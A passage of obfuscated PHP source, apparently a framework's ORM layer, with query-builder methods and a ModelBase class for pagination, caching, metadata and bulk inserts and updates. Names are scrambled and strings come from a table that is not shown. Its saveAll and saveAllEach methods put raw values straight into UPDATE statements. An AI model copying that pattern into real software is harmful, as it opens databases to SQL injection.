$ù±Ô¬ƒÉ»; } return !1; } public function data($„Ôâú¾ó“ = '') { $¶òëæ =& $_SERVER[ÀÆ]; if ($¶òëæ[33] === $„Ôâú¾ó“ && !empty($this->data)) { return $this->data; } if (is_object($„Ôâú¾ó“)) { $„Ôâú¾ó“ = get_object_vars($„Ôâú¾ó“); } elseif (is_string($„Ôâú¾ó“)) { parse_str($„Ôâú¾ó“, $„Ôâú¾ó“); } elseif (!is_array($„Ôâú¾ó“)) { think_exception(think_lang($¶òëæ[269])); } $this->data = $„Ôâú¾ó“; return $this; } public function join($äÊ³Â¦Ñ“) { $Ä¦ =& $_SERVER[ÀÆ]; if (is_array($äÊ³Â¦Ñ“)) { $this->options[$Ä¦[280]] = $äÊ³Â¦Ñ“; } elseif (!empty($äÊ³Â¦Ñ“)) { $this->options[$Ä¦[280]][] = $äÊ³Â¦Ñ“; } return $this; } public function union($´ü…ÉÙş, $á±£š = false) { $ˆ¯Ùã¨ =& $_SERVER[ÀÆ]; if (empty($´ü…ÉÙş)) { return $this; } if ($á±£š) { $this->options[$ˆ¯Ùã¨[345]][$ˆ¯Ùã¨[346]] = !0; } if (is_object($´ü…ÉÙş)) { $´ü…ÉÙş = get_object_vars($´ü…ÉÙş); } if (is_string($´ü…ÉÙş)) { $·æ€‘Šä = $´ü…ÉÙş; } elseif (is_array($´ü…ÉÙş)) { if (isset($´ü…ÉÙş[0])) { $this->options[$ˆ¯Ùã¨[345]] = array_merge($this->options[$ˆ¯Ùã¨[345]], $´ü…ÉÙş); return $this; } else { $·æ€‘Šä = $´ü…ÉÙş; } } else { think_exception(think_lang($ˆ¯Ùã¨[269])); } $this->options[$ˆ¯Ùã¨[345]][] = $·æ€‘Šä; return $this; } public function cache($ÖĞ²åôŞÇ = true, $¡­ûÀÌÅíë¯ = null, $ö¼ûÏÖ÷çŒù¤ = '') { $ÑŒ·ñ“ =& $_SERVER[ÀÆ]; if (!1 !== $ÖĞ²åôŞÇ) { $this->options[$ÑŒ·ñ“[347]] = array($ÑŒ·ñ“[93] => $ÖĞ²åôŞÇ, $ÑŒ·ñ“[337] => $¡­ûÀÌÅíë¯, $ÑŒ·ñ“[29] => $ö¼ûÏÖ÷çŒù¤); } return $this; } public function field($Òâ»”óÂ†µÈ, $± = false) { $¢É»àÈæ =& $_SERVER[ÀÆ]; if (!0 === $Òâ»”óÂ†µÈ) { $³çÔÛ = $this->getDbFields(); $Òâ»”óÂ†µÈ = $³çÔÛ ? $³çÔÛ : $¢É»àÈæ[182]; } elseif ($±) { if (is_string($Òâ»”óÂ†µÈ)) { $Òâ»”óÂ†µÈ = explode($¢É»àÈæ[47], $Òâ»”óÂ†µÈ); } $³çÔÛ = $this->getDbFields(); $Òâ»”óÂ†µÈ = $³çÔÛ ? array_diff($³çÔÛ, $Òâ»”óÂ†µÈ) : $Òâ»”óÂ†µÈ; } $this->options[$¢É»àÈæ[271]] = $Òâ»”óÂ†µÈ; return $this; } public function scope($«Ü‡´÷İğëĞ = '', $¬åà = NULL) { $É‚Î =& $_SERVER[ÀÆ]; if ($É‚Î[33] === $«Ü‡´÷İğëĞ) { if (isset($this->_scope[$É‚Î[34]])) { $’Ö‰ = $this->_scope[$É‚Î[34]]; } else { return $this; } } elseif (is_string($«Ü‡´÷İğëĞ)) { $¬‘‰ = explode($É‚Î[47], $«Ü‡´÷İğëĞ); $’Ö‰ = array(); foreach ($¬‘‰ as $€) { if (!isset($this->_scope[$€])) { continue; } $’Ö‰ = array_merge($’Ö‰, $this->_scope[$€]); } if (!empty($¬åà) && is_array($¬åà)) { $’Ö‰ = array_merge($’Ö‰, $¬åà); } } elseif (is_array($«Ü‡´÷İğëĞ)) { $’Ö‰ = $«Ü‡´÷İğëĞ; } if (is_array($’Ö‰) && !empty($’Ö‰)) { $this->options = array_merge($this->options, array_change_key_case($’Ö‰)); } return $this; } public function where($‹—„­¨§”, $ÚÀÃ½úÔèüÖ = null) { $ş‘ş°ÊšØ =& $_SERVER[ÀÆ]; if (!is_null($ÚÀÃ½úÔèüÖ) && is_string($‹—„­¨§”)) { if (!is_array($ÚÀÃ½úÔèüÖ)) { $ÚÀÃ½úÔèüÖ = func_get_args(); array_shift($ÚÀÃ½úÔèüÖ); } $ÚÀÃ½úÔèüÖ = array_map(array($this->db, $ş‘ş°ÊšØ[341]), $ÚÀÃ½úÔèüÖ); $‹—„­¨§” = vsprintf($‹—„­¨§”, $ÚÀÃ½úÔèüÖ); } elseif (is_object($‹—„­¨§”)) { $‹—„­¨§” = get_object_vars($‹—„­¨§”); } elseif (is_array($‹—„­¨§”)) { foreach ($‹—„­¨§” as $ãôå©ƒÒ => $º ¨Òˆ¸ƒƒ) { if ((is_numeric($ãôå©ƒÒ) || !$ãôå©ƒÒ) && is_string($º ¨Òˆ¸ƒƒ)) { if (strpos($º ¨Òˆ¸ƒƒ, $ş‘ş°ÊšØ[348]) === 0) { continue; } think_trace($ş‘ş°ÊšØ[349], $ş‘ş°ÊšØ[33], $ş‘ş°ÊšØ[46]); die; } } } if (is_string($‹—„­¨§”) && $ş‘ş°ÊšØ[33] != $‹—„­¨§”) { $ƒ£§¹şÒµÅç = array(); $ƒ£§¹şÒµÅç[$ş‘ş°ÊšØ[350]] = $‹—„­¨§”; $‹—„­¨§” = $ƒ£§¹şÒµÅç; } if (isset($this->options[$ş‘ş°ÊšØ[273]])) { $this->options[$ş‘ş°ÊšØ[273]] = array_merge($this->options[$ş‘ş°ÊšØ[273]], $‹—„­¨§”); } else { $this->options[$ş‘ş°ÊšØ[273]] = $‹—„­¨§”; } return $this; } public function limit($–†¢Ş, $É…”ş£Û = null) { $öË =& $_SERVER[ÀÆ]; $this->options[$öË[290]] = is_null($É…”ş£Û) ? $–†¢Ş : $–†¢Ş . $öË[47] . $É…”ş£Û; return $this; } public function page($ö›ò——Â, $µâÈİĞğ¼» = null) { $ù•ôÏµ÷“ğ„ =& $_SERVER[ÀÆ]; $this->options[$ù•ôÏµ÷“ğ„[351]] = is_null($µâÈİĞğ¼») ? $ö›ò——Â : $ö›ò——Â . $ù•ôÏµ÷“ğ„[47] . $µâÈİĞğ¼»; return $this; } public function comment($ÙÛÄ…€) { $this->options[$_SERVER[ÀÆ][352]] = $ÙÛÄ…€; return $this; } public function setProperty($ƒõ, $½í¸å¼À) { if (property_exists($this, $ƒõ)) { $this->{$ƒõ} = $½í¸å¼À; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\124\151\155\x65", "\x74\151\x6d\145", "\151\156\x73\x65\162\x74\x2c\165\160\x64\141\x74\145", "\146\x75\156\x63\164\x69\x6f\x6e"), array("\x63\162\145\141\164\145\x54\x69\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\x74\151\157\156")); public function setDataAuto($ºÃ) { $this->dataAuto = $ºÃ; } public function __construct($É = '', $×±Éêö²ã‡¸ = '', $¯ë£†¨ = '') { parent::__construct($É, $×±Éêö²ã‡¸, $¯ë£†¨); } protected $tableMeta = array(); protected function _beforeInsert(&$İ“ãßÎ, $ùˆ) { $Ñúê =& $_SERVER[ÀÆ]; if (!$this->checkDataAutoHas($Ñúê[353])) { return; } $this->dataBeforeFilter($İ“ãßÎ, $Ñúê[353]); } protected function _beforeUpdate(&$Îæ÷óæÁ, $Š‘İÌƒ) { $Çò¤ÇŸí¼ =& $_SERVER[ÀÆ]; if (!$this->checkDataAutoHas($Çò¤ÇŸí¼[354])) { return; } $this->dataBeforeFilter($Îæ÷óæÁ, $Çò¤ÇŸí¼[354]); } protected function _afterSelect(&$í©£•Ôƒ±û›, $˜á¬áàéæüÈ) { if (!is_array($í©£•Ôƒ±û›)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÀÆ][355])) { return; } foreach ($í©£•Ôƒ±û› as &$Ş˜§Ú£¼) { $this->dataAfterFilter($Ş˜§Ú£¼); } unset($Ş˜§Ú£¼); } protected function _afterFind(&$ÆÔ, $ É) { if (!is_array($ÆÔ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÀÆ][355])) { return; } $this->dataAfterFilter($ÆÔ); } public static function textEncode($Âñß‰¾Ã) { if (!$Âñß‰¾Ã) { return $Âñß‰¾Ã; } $„–¨ü¥¥õÏ÷­ = json_encode($Âñß‰¾Ã); $„–¨ü¥¥õÏ÷­ = preg_replace_callback($_SERVER[ÀÆ][356], function ($ôığøâú) { return addslashes($ôığøâú[0]); }, $„–¨ü¥¥õÏ÷­); return json_decode($„–¨ü¥¥õÏ÷­); } public static function textDecode($Ú®Ù˜) { $‘ =& $_SERVER[ÀÆ]; $—¹± = json_encode($Ú®Ù˜); $—¹± = preg_replace_callback($‘[357], function ($ğ¹) { return $_SERVER[ÀÆ][97]; }, $—¹±); return json_decode($—¹±); } public function setAutoIncrement($÷á‘ùÓ) { $¹½ŸÓë“Ã© = array($this->getPk() => $÷á‘ùÓ); $ŒàŸ÷Š = $this->data($¹½ŸÓë“Ã©)->add(); if ($ŒàŸ÷Š) { $this->delete($ŒàŸ÷Š); } } public function getAutoIncrement() { $ó¸ = $this->getTableName(); $óä¥§Î = $this->max($this->getPk()); $µ¬Çàä = $this->query("\x73\x68\157\167\40\x74\141\142\x6c\145\x20\163\164\141\x74\x75\163\x20\x77\150\x65\x72\x65\40\116\x61\155\145\75\47{$ó¸}\x27"); $“ˆšŠú®ÈÊ = $µ¬Çàä[0][$_SERVER[ÀÆ][358]]; $öçÙ¡¹ûÙ = max($óä¥§Î, $“ˆšŠú®ÈÊ); return $öçÙ¡¹ûÙ; } protected function _callBefore($ÔŠĞ, $×•) { return $this->cacheCallCheck($ÔŠĞ, $×•, !1); } protected function _callAfter($ÌØ”È¬, $ëÜ¯Ÿ‰­) { return $this->cacheCallCheck($ÌØ”È¬, $ëÜ¯Ÿ‰­, !0); } protected function cacheFunctionAlias($’„á) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÃëÄ, $Ã›, $»¼Åê†Œ–é™ı = false) { $Ãò = $this->cacheFunctionAlias($Ã›); if (!$Ãò) { return; } foreach ($Ãò as $Ÿä¥Ø¤ø => $Ø) { $Üå = $Ø[0]; $£¬Õ = explode($_SERVER[ÀÆ][47], $Ø[1]); if ($ÃëÄ == $Ÿä¥Ø¤ø) { return $this->cacheFunctionGet($Ÿä¥Ø¤ø, $Üå); } if ($»¼Åê†Œ–é™ı && in_array($ÃëÄ, $£¬Õ)) { $this->cacheFunctionClear($Ÿä¥Ø¤ø, $Üå); } } } public function cacheFunctionGet($îìƒ, $Ğ°è­£•) { $³ç’ÁÒÈÃ = $this->cacheKeyMake($îìƒ, $Ğ°è­£•); $Ùæ¼æÇæ… = Cache::get($³ç’ÁÒÈÃ); if (!is_array($Ùæ¼æÇæ…)) { $Ùæ¼æÇæ… = call_user_func_array(array($this, $îìƒ), array($Ğ°è­£•, !0)); Cache::set($³ç’ÁÒÈÃ, $Ùæ¼æÇæ…); } return $Ùæ¼æÇæ…; } public function cacheFunctionClear($î, $ë½Š) { $Ü—”÷ = $ë½Š; if (!is_array($ë½Š)) { $Ü—”÷ = array($ë½Š); } foreach ($Ü—”÷ as $°ì±ßÙşØ€) { $îâ¦Ì = $this->cacheKeyMake($î, $°ì±ßÙşØ€); Cache::remove($îâ¦Ì); } } private function cacheKeyMake($¦, $ñ) { $±Ã€şò =& $_SERVER[ÀÆ]; return get_class($this) . $±Ã€şò[71] . $¦ . $±Ã€şò[359] . $ñ; } protected function selectPageReset() { $‰°µ÷ì• =& $_SERVER[ÀÆ]; if (isset($GLOBALS[$‰°µ÷ì•[360]])) { return; } $GLOBALS[$‰°µ÷ì•[360]] = isset($GLOBALS[$‰°µ÷ì•[7]][$‰°µ÷ì•[361]]) ? $GLOBALS[$‰°µ÷ì•[7]][$‰°µ÷ì•[361]] : !1; $GLOBALS[$‰°µ÷ì•[362]] = isset($GLOBALS[$‰°µ÷ì•[7]][$‰°µ÷ì•[351]]) ? $GLOBALS[$‰°µ÷ì•[7]][$‰°µ÷ì•[351]] : !1; $GLOBALS[$‰°µ÷ì•[7]][$‰°µ÷ì•[361]] = !1; $GLOBALS[$‰°µ÷ì•[7]][$‰°µ÷ì•[351]] = !1; } protected function selectPageRestore() { $˜ïÌâá“„ø =& $_SERVER[ÀÆ]; if (!isset($GLOBALS[$˜ïÌâá“„ø[360]])) { return; } $GLOBALS[$˜ïÌâá“„ø[7]][$˜ïÌâá“„ø[361]] = $GLOBALS[$˜ïÌâá“„ø[360]]; $GLOBALS[$˜ïÌâá“„ø[7]][$˜ïÌâá“„ø[351]] = $GLOBALS[$˜ïÌâá“„ø[362]]; if ($GLOBALS[$˜ïÌâá“„ø[7]][$˜ïÌâá“„ø[361]] === !1) { unset($GLOBALS[$˜ïÌâá“„ø[7]][$˜ïÌâá“„ø[361]]); } if ($GLOBALS[$˜ïÌâá“„ø[7]][$˜ïÌâá“„ø[351]] === !1) { unset($GLOBALS[$˜ïÌâá“„ø[7]][$˜ïÌâá“„ø[351]]); } unset($GLOBALS[$˜ïÌâá“„ø[360]]); unset($GLOBALS[$˜ïÌâá“„ø[362]]); } protected function selectPage($ßãíÚ = 200, $¿„ Ïçê§Ë = 1) { $ïÉ™™Æ‰Â =& $_SERVER[ÀÆ]; global $in; $ê£ = $this->optionsValue(); $İ§Ç = 50000; $ßãíÚ = isset($in[$ïÉ™™Æ‰Â[361]]) && $in[$ïÉ™™Æ‰Â[361]] ? $in[$ïÉ™™Æ‰Â[361]] : $ßãíÚ; if ($ßãíÚ === -1) { $in[$ïÉ™™Æ‰Â[361]] = !1; $İ§Ç = 100000000; $ßãíÚ = $İ§Ç; } $÷Œ¶İ˜Âì = $ê£; $÷Œ¶İ˜Âì[$ïÉ™™Æ‰Â[363]] = array(); $ßãíÚ = intval($ßãíÚ); $ßãíÚ = $ßãíÚ <= 5 ? 5 : ($ßãíÚ >= $İ§Ç ? $İ§Ç : $ßãíÚ); $¿„ Ïçê§Ë = intval(isset($in[$ïÉ™™Æ‰Â[351]]) && $in[$ïÉ™™Æ‰Â[351]] ? $in[$ïÉ™™Æ‰Â[351]] : $¿„ Ïçê§Ë); $¿„ Ïçê§Ë = $¿„ Ïçê§Ë <= 1 ? 1 : $¿„ Ïçê§Ë; $í›„½Ğßå = array(); $Ùó = 1; if ($¿„ Ïçê§Ë == 1 && $Ùó) { $this->optionsValue($ê£); $í›„½Ğßå = $this->page($¿„ Ïçê§Ë, $ßãíÚ)->select(); $¤û = is_array($í›„½Ğßå) ? count($í›„½Ğßå) : 0; if ($¤û < $ßãíÚ) { $¢â¥›ô = 1; } else { $this->optionsValue($÷Œ¶İ˜Âì); $¤û = intval($this->count()); $¢â¥›ô = ceil($¤û / $ßãíÚ); } } else { $this->optionsValue($÷Œ¶İ˜Âì); $¤û = intval($this->count()); $¢â¥›ô = ceil($¤û / $ßãíÚ); $¿„ Ïçê§Ë = $¿„ Ïçê§Ë >= $¢â¥›ô ? $¢â¥›ô : $¿„ Ïçê§Ë; $this->optionsValue($ê£); $í›„½Ğßå = $this->page($¿„ Ïçê§Ë, $ßãíÚ)->select(); } if (!is_array($í›„½Ğßå)) { $í›„½Ğßå = array(); } if ($¢â¥›ô == 1) { $¤û = count($í›„½Ğßå); } $±‹²í…¨Åú = array($ïÉ™™Æ‰Â[364] => array($ïÉ™™Æ‰Â[365] => $¤û, $ïÉ™™Æ‰Â[361] => $ßãíÚ, $ïÉ™™Æ‰Â[351] => $¿„ Ïçê§Ë, $ïÉ™™Æ‰Â[366] => $¢â¥›ô), $ïÉ™™Æ‰Â[367] => $í›„½Ğßå); return $±‹²í…¨Åú; } protected function checkLength($ß, $€ñõÒÀ£²Á‡ = 0, $Ùûµ™×³ = '') { $àº›‘á²à =& $_SERVER[ÀÆ]; $€ñõÒÀ£²Á‡ = $€ñõÒÀ£²Á‡ ? $€ñõÒÀ£²Á‡ : 65536; if (!$ß || strlen($ß) < $€ñõÒÀ£²Á‡) { return; } $Ùûµ™×³ = $Ùûµ™×³ ? $Ùûµ™×³ . $àº›‘á²à[68] : $àº›‘á²à[33]; show_json($Ùûµ™×³ . LNG($àº›‘á²à[368]) . "\x28{$€ñõÒÀ£²Á‡}\x29", !1); } protected function metaSet($¥´‰¬”¶¶ë, $µç¦÷Ñ˜ = null, $ÀË°½“Ï = null) { $Ê· =& $_SERVER[ÀÆ]; if (!$this->tableMeta || !$¥´‰¬”¶¶ë) { return !1; } $¨ = $this->tableMeta[$Ê·[369]]; $µ = $this->tableMeta[$Ê·[370]]; $ÀÚ = Model($µ); $ç©±ûÎ½ = array($¨ => $¥´‰¬”¶¶ë, $Ê·[371] => $µç¦÷Ñ˜); if (is_null($µç¦÷Ñ˜)) { return $ÀÚ->where(array($¨ => $¥´‰¬”¶¶ë))->delete(); } if (is_null($ÀË°½“Ï) && is_string($µç¦÷Ñ˜)) { return $ÀÚ->where($ç©±ûÎ½)->delete(); } $†Â´ô³àé» = is_array($µç¦÷Ñ˜) ? $µç¦÷Ñ˜ : array(); if (is_string($µç¦÷Ñ˜)) { $†Â´ô³àé»[$µç¦÷Ñ˜] = $ÀË°½“Ï; } $©¤èÆÛ´ = array(); foreach ($†Â´ô³àé» as $ë—÷Å => $òïŠˆëŸ«à) { if (is_null($òïŠˆëŸ«à) && is_string($ë—÷Å)) { $ÀÚ->where(array($¨ => $¥´‰¬”¶¶ë, $Ê·[371] => $ë—÷Å))->delete(); continue; } $this->checkLength($òïŠˆëŸ«à, !1, $µ . $Ê·[4] . $ë—÷Å); $©¤èÆÛ´[] = array($¨ => $¥´‰¬”¶¶ë, $Ê·[93] => $ë—÷Å, $Ê·[372] => $òïŠˆëŸ«à); } $ı“Ûú§ = $Ê·[373] . $µ; CacheLock::lock($ı“Ûú§); $ÀÚ->where(array($¨ => $¥´‰¬”¶¶ë))->addAll($©¤èÆÛ´, array(), !0); CacheLock::unlock($ı“Ûú§); return !0; } public function metaGet($üãĞ, $ûÀ¥ö‡ÌÇ» = false) { $Æè°Âèö =& $_SERVER[ÀÆ]; if (!$this->tableMeta) { return array(); } $„£ÉçÒâÆ = $this->tableMeta[$Æè°Âèö[369]]; $Õ‘–õÏÓ = Model($this->tableMeta[$Æè°Âèö[370]]); if ($ûÀ¥ö‡ÌÇ») { $¤ä = array($„£ÉçÒâÆ => $üãĞ, $Æè°Âèö[93] => $ûÀ¥ö‡ÌÇ»); return $Õ‘–õÏÓ->where($¤ä)->getField($Æè°Âèö[372]); } $¤ä = array($„£ÉçÒâÆ => $üãĞ); $ƒÅ = $Õ‘–õÏÓ->field($Æè°Âèö[374])->where($¤ä)->select(); $ƒÅ = array_to_keyvalue($ƒÅ, $Æè°Âèö[93], $Æè°Âèö[372]); return $ƒÅ; } private function checkDataAutoHas($ÓŞë) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¾­¶±İÂ¿) { if (in_array($ÓŞë, explode($_SERVER[ÀÆ][47], $¾­¶±İÂ¿[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ğÓÍõëˆÒÛî±, $³Õãˆ) { $µª =& $_SERVER[ÀÆ]; foreach ($this->dataAuto as $ãÈ«òÓÇÃñ) { $™ú‹ç­ú¯ = $ãÈ«òÓÇÃñ[0]; if (!in_array($³Õãˆ, explode($µª[47], $ãÈ«òÓÇÃñ[2]))) { continue; } switch (trim($ãÈ«òÓÇÃñ[3])) { case $µª[319]: case $µª[320]: $Ğ¿“§¦Íˆ = $ãÈ«òÓÇÃñ[1]; $ö°ƒãÙºØ¢‘ = isset($ãÈ«òÓÇÃñ[4]) ? (array) $ãÈ«òÓÇÃñ[4] : array(); if ($Ğ¿“§¦Íˆ == $µª[197] && array_key_exists($™ú‹ç­ú¯, $ğÓÍõëˆÒÛî±)) { if (!$ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]) { unset($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]); } break; } if (isset($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯])) { array_unshift($ö°ƒãÙºØ¢‘, $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]); } if ($µª[319] == $ãÈ«òÓÇÃñ[3]) { $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] = call_user_func_array($Ğ¿“§¦Íˆ, $ö°ƒãÙºØ¢‘); } else { $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] = call_user_func_array(array(&$this, $Ğ¿“§¦Íˆ), $ö°ƒãÙºØ¢‘); } break; case $µª[268]: if (isset($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]) && $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]) { $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] = call_user_func_array(array(&$this, $ãÈ«òÓÇÃñ[1]), array($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯])); } break; case $µª[271]: $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] = $ğÓÍõëˆÒÛî±[$ãÈ«òÓÇÃñ[1]]; break; case $µª[292]: if (isset($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]) && !is_string($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯])) { $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] = json_encode_force($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]); } break; case $µª[321]: if ($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] === $µª[33]) { unset($ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯]); } break; case $µª[322]: $ğÓÍõëˆÒÛî±[$™ú‹ç­ú¯] = $ãÈ«òÓÇÃñ[1]; default: break; } } if ($³Õãˆ == $µª[353]) { $“ğÎ£‰ = strtolower($this->db->getDbType()); if (strpos($“ğÎ£‰, $µª[9]) !== 0) { return; } $°¹ï = $this->field(!0)->fields; $ùƒšÜúÀ’˜ = $°¹ï[$µª[250]]; if (isset($°¹ï[$µª[249]])) { unset($ùƒšÜúÀ’˜[$°¹ï[$µª[249]]]); } foreach ($ùƒšÜúÀ’˜ as $”ê› => $³Õãˆ) { if (!isset($ğÓÍõëˆÒÛî±[$”ê›])) { $ğÓÍõëˆÒÛî±[$”ê›] = $µª[33]; } } } } private function dataAfterFilter(&$ÃÚ§£ì•µê) { $æ” =& $_SERVER[ÀÆ]; foreach ($this->dataAuto as $‘¥) { $Ş = $‘¥[0]; if (!isset($ÃÚ§£ì•µê[$Ş])) { continue; } if (!in_array($æ”[355], explode($æ”[47], $‘¥[2]))) { continue; } switch (trim($‘¥[3])) { case $æ”[319]: case $æ”[320]: $…‘ = isset($‘¥[4]) ? (array) $‘¥[4] : array(); array_unshift($…‘, $ÃÚ§£ì•µê[$Ş]); if (isset($‘¥[4]) && $‘¥[4] == $æ”[375]) { $…‘ = array($ÃÚ§£ì•µê[$Ş]); } if ($æ”[319] == $‘¥[3]) { $ÃÚ§£ì•µê[$Ş] = call_user_func_array($‘¥[1], $…‘); } else { $ÃÚ§£ì•µê[$Ş] = call_user_func_array(array(&$this, $‘¥[1]), $…‘); } break; case $æ”[268]: if (isset($ÃÚ§£ì•µê[$Ş]) && $ÃÚ§£ì•µê[$Ş]) { $ÃÚ§£ì•µê[$Ş] = call_user_func_array(array(&$this, $‘¥[1]), array($ÃÚ§£ì•µê[$Ş])); } break; case $æ”[271]: $ÃÚ§£ì•µê[$Ş] = $ÃÚ§£ì•µê[$‘¥[1]]; break; case $æ”[292]: $¥’íšÑğ¨¿ò = $ÃÚ§£ì•µê[$Ş]; $ÃÚ§£ì•µê[$Ş] = json_decode($¥’íšÑğ¨¿ò, !0); if (is_null($ÃÚ§£ì•µê[$Ş])) { $ÃÚ§£ì•µê[$Ş] = $¥’íšÑğ¨¿ò; } break; case $æ”[321]: if ($ÃÚ§£ì•µê[$Ş] === $æ”[33]) { unset($ÃÚ§£ì•µê[$Ş]); } break; case $æ”[322]: $ÃÚ§£ì•µê[$Ş] = $‘¥[1]; break; default: break; } } } public function saveAll($¬ØŸó­öÈ­Á) { $ıÉÀ„ì™ÊÖæ =& $_SERVER[ÀÆ]; $šÉ¤ÁÕ³ÖÃ = $this->tablePrefix . $this->tableName; $¡Ø–Ï¢ = self::SQL_WHERE_IN_CHUNK; $¬ØŸó­öÈ­Á = is_array($¬ØŸó­öÈ­Á) ? $¬ØŸó­öÈ­Á : array(); $À¡¬¢Ÿæä¡ø = $ıÉÀ„ì™ÊÖæ[376]; $¦Ÿ®¸‰ = 0; $œÔëïñóß­ = array(); $âÊ½ = count($¬ØŸó­öÈ­Á); for ($Ş½ïíÜöÁ£ = 0; $Ş½ïíÜöÁ£ < $âÊ½; $Ş½ïíÜöÁ£++) { $ı‡ø = $¬ØŸó­öÈ­Á[$Ş½ïíÜöÁ£]; if (!is_array($ı‡ø) || count($ı‡ø) != 4) { continue; } $…æ¤³ÖöÃ’„¹ = "\x55\120\x44\x41\124\105\40\x60{$šÉ¤ÁÕ³ÖÃ}\140\x20\123\105\x54\x20{$ı‡ø[2]}\40\75\40\103\x41\123\x45\x20{$ı‡ø[0]}\40\12"; if ($¦Ÿ®¸‰ == 0) { $À¡¬¢Ÿæä¡ø = $…æ¤³ÖöÃ’„¹; } $œÔëïñóß­[] = $ıÉÀ„ì™ÊÖæ[116] . $ı‡ø[1] . $ıÉÀ„ì™ÊÖæ[116]; $¦Ÿ®¸‰++; $À¡¬¢Ÿæä¡ø .= "\40\127\110\x45\116\40\x27{$ı‡ø[1]}\x27\40\124\x48\105\116\x20\x27{$ı‡ø[3]}\x27\40\xa"; if ($¦Ÿ®¸‰ == $¡Ø–Ï¢ || $Ş½ïíÜöÁ£ == $âÊ½ - 1) { $É¼‡ = implode($ıÉÀ„ì™ÊÖæ[47], $œÔëïñóß­); $À¡¬¢Ÿæä¡ø .= "\40\x45\116\x44\40\x20\x57\x48\x45\122\105\x20{$ı‡ø[0]}\x20\111\x4e\40\50{$É¼‡}\51\40"; $this->execute($À¡¬¢Ÿæä¡ø); $¦Ÿ®¸‰ = 0; $À¡¬¢Ÿæä¡ø = $…æ¤³ÖöÃ’„¹; $this->chunkEventCheck(count($œÔëïñóß­)); $œÔëïñóß­ = array(); } } $this->chunkEventSet(); } public function saveAllEach($×ò°’÷„†ß) { $Â¸š¶§ =& $_SERVER[ÀÆ]; $ßÌ¶¡¯ˆ° = $this->tablePrefix . $this->tableName; foreach ($×ò°’÷„†ß as $—ƒÍ»‚â¦ÃÊ) { if (!is_array($—ƒÍ»‚â¦ÃÊ) || count($—ƒÍ»‚â¦ÃÊ) != 4) { continue; } $ÈÉ™Ù±ó = $—ƒÍ»‚â¦ÃÊ[0] . $Â¸š¶§[377] . $—ƒÍ»‚â¦ÃÊ[1] . $Â¸š¶§[116]; $‹û½ûÔÄ = $—ƒÍ»‚â¦ÃÊ[2] . $Â¸š¶§[377] . $—ƒÍ»‚â¦ÃÊ[3] . $Â¸š¶§[116]; $ê–ªíÛ¥Õü = "\165\x70\144\141\x74\145\40{$ßÌ¶¡¯ˆ°}\40\x73\x65\164\40{$‹û½ûÔÄ}\40\167\x68\x65\x72\145\x20{$ÈÉ™Ù±ó}\73"; $this->execute($ê–ªíÛ¥Õü); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($»èÒûË…âìŠÊ = false, $·Í = false) { $this->_chunkEvent = $»èÒûË…âìŠÊ; $this->_chunkEventParam = $·Í; } private function chunkEventCheck($üğ»ç) { if (!$this->_chunkEvent) { return; } $øÒ ÷ä´ÌŠ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $øÒ ÷ä´ÌŠ[$_SERVER[ÀÆ][378]] = $üğ»ç; Hook::trigger($this->_chunkEvent, $øÒ ÷ä´ÌŠ); } public function addAll($³èÍ“¼ää, $ÍÑ = array(), $ç‚´‚ĞüßÄó = false) { $ÑáóÜà¶§°° =& $_SERVER[ÀÆ]; ignore_timeout(); $‡Ÿ•Æ¦¨İ“œ” = self::SQL_WHERE_IN_CHUNK; if (empty($³èÍ“¼ää)) { $this->error = think_lang($ÑáóÜà¶§°°[269]); return !1; } $ÍÑ = $this->_parseOptions($ÍÑ); foreach ($³èÍ“¼ää as $ˆÈ£ê => $™öšŞ—”) { $³èÍ“¼ää[$ˆÈ£ê] = $this->_facade($™öšŞ—”); $this->_beforeInsert($³èÍ“¼ää[$ˆÈ£ê], $ÍÑ); } if (method_exists($this->db, $ÑáóÜà¶§°°[270])) { for ($Š‹˜«ïíÆê = 0; $Š‹˜«ïíÆê < count($³èÍ“¼ää); $Š‹˜«ïíÆê += $‡Ÿ•Æ¦¨İ“œ”) { $•íªÛà³çö = array_slice($³èÍ“¼ää, $Š‹˜«ïíÆê, $‡Ÿ•Æ¦¨İ“œ”); if (!is_array($•íªÛà³çö) || count($•íªÛà³çö) == 0) { break; } $¡¡äá¬‡ = $this->db->insertAll($•íªÛà³çö, $ÍÑ, $ç‚´‚ĞüßÄó); $this->chunkEventCheck(count($•íªÛà³çö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($³èÍ“¼ää as $ˆÈ£ê => $™öšŞ—”) { $¡¡äá¬‡ = $this->db->insert($™öšŞ—”, $ÍÑ, $ç‚´‚ĞüßÄó); } $this->commit(); } if (!1 !== $¡¡äá¬‡) { $íÄš£¢ñï“ = $this->getLastInsID(); if ($íÄš£¢ñï“) { return $íÄš£¢ñï“; } } return $¡¡äá¬‡; } public function save($ŞÏ…ÕÒ¸ = '', $» = array()) { $äå³š¸ëñ =& $_SERVER[ÀÆ]; $é = self::SQL_WHERE_IN_CHUNK; $ñµë†É¹æÓ = $this->optionsValue(); 